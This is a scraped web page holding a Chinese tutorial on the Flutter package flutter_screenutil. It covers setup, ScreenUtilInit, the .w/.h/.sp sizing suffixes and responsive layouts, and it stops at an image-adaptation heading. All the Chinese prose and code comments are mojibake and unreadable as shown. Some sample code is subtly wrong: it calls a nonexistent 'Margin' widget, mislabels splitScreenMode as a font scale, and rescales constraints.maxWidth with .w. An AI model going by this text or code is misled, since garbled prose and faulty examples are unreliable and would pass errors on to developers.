                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>åœ¨Flutterå¼€å‘ä¸­ï¼Œå±å¹•å°ºå¯¸ç¢ç‰‡åŒ–æ˜¯å½±å“ç”¨æˆ·ä½“éªŒçš„å…³é”®é—®é¢˜ã€‚ä¸åŒè®¾å¤‡çš„åˆ†è¾¨ç‡ã€åƒç´ å¯†åº¦å·®å¼‚ä¼šå¯¼è‡´UIå¸ƒå±€åœ¨éƒ¨åˆ†è®¾å¤‡ä¸Šå‡ºç°é”™ä½ã€æ‹‰ä¼¸æˆ–ç•™ç™½ç­‰é—®é¢˜ã€‚<code>flutter_screenutil</code>ä½œä¸ºä¸€æ¬¾ä¸“æ³¨äºå±å¹•è‡ªé€‚åº”çš„ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œé€šè¿‡ç®€å•ç›´è§‚çš„APIå®ç°äº†"ä¸€å¥—ä»£ç é€‚é…æ‰€æœ‰å±å¹•"çš„ç›®æ ‡ï¼Œå·²æˆä¸ºFlutterç”Ÿæ€ä¸­æœ€å—æ¬¢è¿çš„è‡ªé€‚åº”è§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-0">1. æ’ä»¶æ ¸å¿ƒä»·å€¼ä¸å·¥ä½œåŸç†</h2>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒè§£å†³çš„é—®é¢˜</h3>
<p>ä¼ ç»Ÿçš„å›ºå®šå°ºå¯¸å¼€å‘æ¨¡å¼å­˜åœ¨ä¸‰å¤§ç—›ç‚¹ï¼š</p>
<ul>
<li><strong>å°ºå¯¸é€‚é…éš¾é¢˜</strong>ï¼šç›¸åŒæ•°å€¼çš„å°ºå¯¸åœ¨ä¸åŒåˆ†è¾¨ç‡è®¾å¤‡ä¸Šæ˜¾ç¤ºæ•ˆæœå·®å¼‚å·¨å¤§</li>
<li><strong>åƒç´ å¯†åº¦é€‚é…</strong>ï¼šä¸åŒDPIè®¾å¤‡å¯¹å›¾ç‰‡ã€å­—ä½“çš„æ¸²æŸ“ç²¾åº¦è¦æ±‚ä¸åŒ</li>
<li><strong>å±å¹•æ¯”ä¾‹é€‚é…</strong>ï¼šä»4.7è‹±å¯¸æ‰‹æœºåˆ°10.9è‹±å¯¸å¹³æ¿çš„å®½é«˜æ¯”å·®å¼‚å¯¼è‡´å¸ƒå±€å˜å½¢</li>
</ul>
<p><code>flutter_screenutil</code>é€šè¿‡ç»Ÿä¸€çš„å°ºå¯¸è½¬æ¢æœºåˆ¶ï¼Œå°†è®¾è®¡ç¨¿å°ºå¯¸è‡ªåŠ¨æ˜ å°„ä¸ºä¸åŒè®¾å¤‡çš„å®é™…æ˜¾ç¤ºå°ºå¯¸ï¼Œå®Œç¾è§£å†³äº†ä»¥ä¸Šé—®é¢˜ã€‚</p>
<h3 data-id="heading-2">1.2 æ ¸å¿ƒå·¥ä½œåŸç†</h3>
<p>è¯¥æ’ä»¶çš„æ ¸å¿ƒå®ç°åŸºäºä¸¤ä¸ªå…³é”®æ¦‚å¿µï¼š</p>
<ol>
<li><strong>è®¾è®¡ç¨¿åŸºå‡†</strong>ï¼šä»¥ç‰¹å®šå°ºå¯¸çš„è®¾è®¡ç¨¿ï¼ˆå¦‚375Ã—812pxçš„iPhone Xï¼‰ä½œä¸ºåŸºå‡†</li>
<li><strong>åŠ¨æ€æ¯”ä¾‹è®¡ç®—</strong>ï¼šæ ¹æ®å½“å‰è®¾å¤‡å±å¹•å°ºå¯¸ä¸è®¾è®¡ç¨¿å°ºå¯¸çš„æ¯”ä¾‹ï¼ŒåŠ¨æ€è®¡ç®—å®é™…æ˜¾ç¤ºå°ºå¯¸</li>
</ol>
<p>å…·ä½“è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š</p>
<ul>
<li>å®½åº¦é€‚é…ï¼š<code>å®é™…å®½åº¦ = è®¾è®¡ç¨¿å®½åº¦ Ã— (è®¾å¤‡å±å¹•å®½åº¦ / è®¾è®¡ç¨¿åŸºå‡†å®½åº¦)</code></li>
<li>é«˜åº¦é€‚é…ï¼š<code>å®é™…é«˜åº¦ = è®¾è®¡ç¨¿é«˜åº¦ Ã— (è®¾å¤‡å±å¹•é«˜åº¦ / è®¾è®¡ç¨¿åŸºå‡†é«˜åº¦)</code></li>
<li>å­—ä½“é€‚é…ï¼šåœ¨å®½åº¦é€‚é…åŸºç¡€ä¸Šï¼Œå¯é¢å¤–è®¾ç½®å­—ä½“ç¼©æ”¾æ¯”ä¾‹</li>
</ul>
<h2 data-id="heading-3">2. åŸºç¡€é›†æˆä¸åˆå§‹åŒ–</h2>
<h3 data-id="heading-4">2.1 ç¯å¢ƒè¦æ±‚</h3>
<ul>
<li>Flutterç‰ˆæœ¬ â‰¥ 2.0.0</li>
<li>Dartç‰ˆæœ¬ â‰¥ 2.12.0ï¼ˆç©ºå®‰å…¨æ”¯æŒï¼‰</li>
</ul>
<h3 data-id="heading-5">2.2 é›†æˆæ­¥éª¤</h3>
<h4 data-id="heading-6">ç¬¬ä¸€æ­¥ï¼šæ·»åŠ ä¾èµ–</h4>
<p>åœ¨<code>pubspec.yaml</code>æ–‡ä»¶ä¸­æ·»åŠ æœ€æ–°ç‰ˆæœ¬ä¾èµ–ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>
  <span class="hljs-attr">flutter_screenutil:</span> <span class="hljs-string">^5.9.0</span>  <span class="hljs-comment"># å»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬</span>
</code></pre>
<p>æ‰§è¡Œä¾èµ–å®‰è£…å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub get
</code></pre>
<h4 data-id="heading-7">ç¬¬äºŒæ­¥ï¼šå¯¼å…¥åŒ…</h4>
<p>åœ¨éœ€è¦ä½¿ç”¨çš„dartæ–‡ä»¶ä¸­å¯¼å…¥ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_screenutil/flutter_screenutil.dart'</span>;
</code></pre>
<h4 data-id="heading-8">ç¬¬ä¸‰æ­¥ï¼šåˆå§‹åŒ–é…ç½®</h4>
<p>åœ¨åº”ç”¨å…¥å£<code>MaterialApp</code>çš„<code>builder</code>ä¸­åˆå§‹åŒ–<code>ScreenUtilInit</code>ï¼Œé…ç½®è®¾è®¡ç¨¿åŸºå‡†å°ºå¯¸ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> main() {
  runApp(<span class="hljs-keyword">const</span> MyApp());
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> MyApp({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ScreenUtilInit(
      <span class="hljs-comment">// è®¾è®¡ç¨¿å®½åº¦ï¼ˆå•ä½ï¼špxï¼‰</span>
      designSize: <span class="hljs-keyword">const</span> Size(<span class="hljs-number">375</span>, <span class="hljs-number">812</span>), 
      <span class="hljs-comment">// æ˜¯å¦å…è®¸å­—ä½“æ ¹æ®ç³»ç»Ÿç¼©æ”¾æ¯”ä¾‹è°ƒæ•´</span>
      minTextAdapt: <span class="hljs-keyword">true</span>,
      <span class="hljs-comment">// å­—ä½“ç¼©æ”¾æ¯”ä¾‹ï¼ˆå¯é€‰ï¼Œé»˜è®¤1.0ï¼‰</span>
      splitScreenMode: <span class="hljs-keyword">true</span>,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> MaterialApp(
          title: <span class="hljs-string">'ScreenUtil Demo'</span>,
          <span class="hljs-comment">// è®¾ç½®å…¨å±€å­—ä½“å¤§å°é€‚é…</span>
          theme: ThemeData(
            textTheme: TextTheme(
              bodyLarge: TextStyle(fontSize: <span class="hljs-number">16.</span>sp),
              bodyMedium: TextStyle(fontSize: <span class="hljs-number">14.</span>sp),
            ),
          ),
          home: <span class="hljs-keyword">const</span> HomePage(),
        );
      },
    );
  }
}
</code></pre>
<p><strong>å…³é”®å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>designSize</code>ï¼šå¿…å¡«ï¼Œè®¾è®¡ç¨¿çš„å®½é«˜å°ºå¯¸ï¼ˆå»ºè®®ä½¿ç”¨UIæä¾›çš„æ ‡å‡†è®¾è®¡ç¨¿å°ºå¯¸ï¼‰</li>
<li><code>minTextAdapt</code>ï¼šå¯é€‰ï¼Œæ˜¯å¦å¼€å¯å­—ä½“æœ€å°é€‚é…ï¼Œé˜²æ­¢å­—ä½“è¿‡å°</li>
<li><code>splitScreenMode</code>ï¼šå¯é€‰ï¼Œæ˜¯å¦æ”¯æŒåˆ†å±æ¨¡å¼é€‚é…</li>
<li><code>builder</code>ï¼šå¿…å¡«ï¼Œåˆå§‹åŒ–å®Œæˆåçš„æ„å»ºå›è°ƒï¼Œè¿”å›åº”ç”¨ä¸»ç•Œé¢</li>
</ul>
<h2 data-id="heading-9">3. æ ¸å¿ƒAPIä¸åŸºç¡€ç”¨æ³•</h2>
<p><code>flutter_screenutil</code>æä¾›äº†ç›´è§‚çš„å°ºå¯¸è½¬æ¢APIï¼Œé€šè¿‡åœ¨æ•°å€¼åæ·»åŠ ç‰¹å®šåç¼€å®ç°ä¸åŒç±»å‹çš„é€‚é…ï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ä¸‰ç±»ï¼š</p>
<h3 data-id="heading-10">3.1 å°ºå¯¸é€‚é…ï¼ˆdpå•ä½ï¼‰</h3>
<p>ç”¨äºWidgetçš„å®½é«˜ã€å†…è¾¹è·ã€å¤–è¾¹è·ç­‰å°ºå¯¸å±æ€§ï¼Œä½¿ç”¨<code>.w</code>ï¼ˆå®½åº¦æ–¹å‘ï¼‰å’Œ<code>.h</code>ï¼ˆé«˜åº¦æ–¹å‘ï¼‰åç¼€ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 1. å®¹å™¨å°ºå¯¸é€‚é…</span>
Container(
  <span class="hljs-comment">// è®¾è®¡ç¨¿å®½åº¦100px â†’ å®é™…å®½åº¦=100 Ã— (è®¾å¤‡å®½åº¦/375)</span>
  width: <span class="hljs-number">100.</span>w,
  <span class="hljs-comment">// è®¾è®¡ç¨¿é«˜åº¦50px â†’ å®é™…é«˜åº¦=50 Ã— (è®¾å¤‡é«˜åº¦/812)</span>
  height: <span class="hljs-number">50.</span>h,
  color: Colors.blue,
  child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'å°ºå¯¸é€‚é…ç¤ºä¾‹'</span>),
)

<span class="hljs-comment">// 2. å†…è¾¹è·é€‚é…</span>
Padding(
  <span class="hljs-comment">// ä¸Šä¸‹å·¦å³å„16pxçš„å†…è¾¹è·ï¼Œåˆ†åˆ«æŒ‰å®½é«˜æ–¹å‘é€‚é…</span>
  padding: EdgeInsets.all(<span class="hljs-number">16.</span>w), 
  child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'å†…è¾¹è·é€‚é…'</span>),
)

<span class="hljs-comment">// 3. å¤–è¾¹è·é€‚é…</span>
Margin(
  margin: EdgeInsets.symmetric(
    horizontal: <span class="hljs-number">20.</span>w,  <span class="hljs-comment">// æ°´å¹³æ–¹å‘æŒ‰å®½åº¦æ¯”ä¾‹é€‚é…</span>
    vertical: <span class="hljs-number">10.</span>h     <span class="hljs-comment">// å‚ç›´æ–¹å‘æŒ‰é«˜åº¦æ¯”ä¾‹é€‚é…</span>
  ),
  child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'å¤–è¾¹è·é€‚é…'</span>),
)
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>å®½åº¦ç›¸å…³å±æ€§ï¼ˆå¦‚<code>width</code>ã€<code>horizontal</code>ï¼‰å»ºè®®ä½¿ç”¨<code>.w</code>åç¼€</li>
<li>é«˜åº¦ç›¸å…³å±æ€§ï¼ˆå¦‚<code>height</code>ã€<code>vertical</code>ï¼‰å»ºè®®ä½¿ç”¨<code>.h</code>åç¼€</li>
<li>æ­£æ–¹å½¢å°ºå¯¸ï¼ˆå¦‚åœ†å½¢å¤´åƒï¼‰å»ºè®®ç»Ÿä¸€ä½¿ç”¨<code>.w</code>æˆ–<code>.h</code>ï¼Œé¿å…å®½é«˜æ¯”ä¾‹ä¸ä¸€è‡´</li>
</ul>
<h3 data-id="heading-11">3.2 å­—ä½“é€‚é…ï¼ˆspå•ä½ï¼‰</h3>
<p>ç”¨äºæ–‡æœ¬å­—ä½“å¤§å°é€‚é…ï¼Œä½¿ç”¨<code>.sp</code>åç¼€ï¼Œè‡ªåŠ¨é€‚é…ä¸åŒè®¾å¤‡çš„å­—ä½“ç¼©æ”¾è®¾ç½®ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// åŸºç¡€å­—ä½“é€‚é…</span>
Text(
  <span class="hljs-string">'å­—ä½“é€‚é…ç¤ºä¾‹'</span>,
  style: TextStyle(
    <span class="hljs-comment">// è®¾è®¡ç¨¿å­—ä½“å¤§å°18px â†’ è‡ªåŠ¨é€‚é…è®¾å¤‡</span>
    fontSize: <span class="hljs-number">18.</span>sp,
    fontWeight: FontWeight.bold,
  ),
)

<span class="hljs-comment">// å¸¦æœ€å°å­—ä½“é™åˆ¶çš„é€‚é…</span>
Text(
  <span class="hljs-string">'æœ€å°å­—ä½“é€‚é…'</span>,
  style: TextStyle(
    fontSize: <span class="hljs-number">12.</span>spMin,  <span class="hljs-comment">// ç¡®ä¿å­—ä½“ä¸å°äº12px</span>
  ),
)
</code></pre>
<p><strong>å­—ä½“é€‚é…ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>è‡ªåŠ¨å“åº”ç³»ç»Ÿå­—ä½“ç¼©æ”¾è®¾ç½®ï¼ˆå¦‚ç”¨æˆ·åœ¨ç³»ç»Ÿè®¾ç½®ä¸­æ”¾å¤§å­—ä½“ï¼‰</li>
<li>é€šè¿‡<code>spMin</code>ç¡®ä¿å­—ä½“ä¸ä¼šå› å±å¹•è¿‡å°è€Œå˜å¾—éš¾ä»¥é˜…è¯»</li>
<li>å…¨å±€ç»Ÿä¸€çš„å­—ä½“ç¼©æ”¾æ¯”ä¾‹ï¼Œä¾¿äºæ•´ä½“è°ƒæ•´</li>
</ul>
<h3 data-id="heading-12">3.3 å±å¹•å°ºå¯¸å·¥å…·ç±»</h3>
<p><code>ScreenUtil</code>ç±»æä¾›äº†ä¸°å¯Œçš„å±å¹•ä¿¡æ¯è·å–æ–¹æ³•ï¼Œæ–¹ä¾¿åœ¨ç‰¹æ®Šåœºæ™¯ä¸‹ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// è·å–å±å¹•å®½åº¦ï¼ˆpxï¼‰</span>
<span class="hljs-built_in">double</span> screenWidth = ScreenUtil().screenWidth;

<span class="hljs-comment">// è·å–å±å¹•é«˜åº¦ï¼ˆpxï¼‰</span>
<span class="hljs-built_in">double</span> screenHeight = ScreenUtil().screenHeight;

<span class="hljs-comment">// è·å–çŠ¶æ€æ é«˜åº¦</span>
<span class="hljs-built_in">double</span> statusBarHeight = ScreenUtil().statusBarHeight;

<span class="hljs-comment">// è·å–åº•éƒ¨å®‰å…¨åŒºåŸŸé«˜åº¦ï¼ˆé€‚ç”¨äºå…¨é¢å±ï¼‰</span>
<span class="hljs-built_in">double</span> bottomBarHeight = ScreenUtil().bottomBarHeight;

<span class="hljs-comment">// è·å–å±å¹•åƒç´ å¯†åº¦</span>
<span class="hljs-built_in">double</span> pixelRatio = ScreenUtil().pixelRatio;

<span class="hljs-comment">// è®¾è®¡ç¨¿å®½åº¦ä¸å®é™…å±å¹•å®½åº¦çš„æ¯”ä¾‹</span>
<span class="hljs-built_in">double</span> scaleWidth = ScreenUtil().scaleWidth;

<span class="hljs-comment">// è®¾è®¡ç¨¿é«˜åº¦ä¸å®é™…å±å¹•é«˜åº¦çš„æ¯”ä¾‹</span>
<span class="hljs-built_in">double</span> scaleHeight = ScreenUtil().scaleHeight;
</code></pre>
<p><strong>å®ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>æ ¹æ®å±å¹•å®½åº¦åŠ¨æ€è°ƒæ•´ç½‘æ ¼å¸ƒå±€çš„åˆ—æ•°</li>
<li>æ ¹æ®å®‰å…¨åŒºåŸŸé«˜åº¦è°ƒæ•´åº•éƒ¨æŒ‰é’®ä½ç½®</li>
<li>æ ¹æ®å±å¹•æ¯”ä¾‹å†³å®šæ˜¯å¦æ˜¾ç¤ºæŸäº›UIå…ƒç´ </li>
</ul>
<h2 data-id="heading-13">4. é«˜çº§åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-14">4.1 å¤šè®¾è®¡ç¨¿å°ºå¯¸é€‚é…</h3>
<p>å¯¹äºéœ€è¦åŒæ—¶é€‚é…æ‰‹æœºå’Œå¹³æ¿çš„åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡<code>ScreenUtilInit</code>çš„<code>designSize</code>åŠ¨æ€åˆ‡æ¢è®¾è®¡ç¨¿åŸºå‡†ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">ScreenUtilInit(
  <span class="hljs-comment">// æ ¹æ®å±å¹•å®½åº¦åˆ¤æ–­ä½¿ç”¨æ‰‹æœºè¿˜æ˜¯å¹³æ¿è®¾è®¡ç¨¿</span>
  designSize: MediaQuery.of(context).size.width &gt; <span class="hljs-number">600</span> 
      ? <span class="hljs-keyword">const</span> Size(<span class="hljs-number">1024</span>, <span class="hljs-number">1366</span>)  <span class="hljs-comment">// å¹³æ¿è®¾è®¡ç¨¿</span>
      : <span class="hljs-keyword">const</span> Size(<span class="hljs-number">375</span>, <span class="hljs-number">812</span>),   <span class="hljs-comment">// æ‰‹æœºè®¾è®¡ç¨¿</span>
  builder: (context, child) {
    <span class="hljs-comment">// ...</span>
  },
)
</code></pre>
<h3 data-id="heading-15">4.2 å“åº”å¼å¸ƒå±€ç»“åˆ</h3>
<p>å°†<code>flutter_screenutil</code>ä¸FlutteråŸç”Ÿçš„<code>LayoutBuilder</code>ã€<code>MediaQuery</code>ç»“åˆï¼Œå®ç°æ›´ç²¾ç»†çš„å“åº”å¼å¸ƒå±€ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">LayoutBuilder(
  builder: (context, constraints) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        <span class="hljs-comment">// å›ºå®šé«˜åº¦çš„å¤´éƒ¨ï¼ˆä½¿ç”¨hé€‚é…ï¼‰</span>
        Container(height: <span class="hljs-number">80.</span>h, color: Colors.blue),
        <span class="hljs-comment">// å æ»¡å‰©ä½™é«˜åº¦çš„å†…å®¹åŒº</span>
        Expanded(
          child: Container(
            width: constraints.maxWidth.w,  <span class="hljs-comment">// ç»“åˆå¸ƒå±€çº¦æŸ</span>
            color: Colors.grey[<span class="hljs-number">200</span>],
          ),
        ),
      ],
    );
  },
)
</code></pre>
<h3 data-id="heading-16">4.3 å›¾ç‰‡è‡ªé€‚åº”</h3>
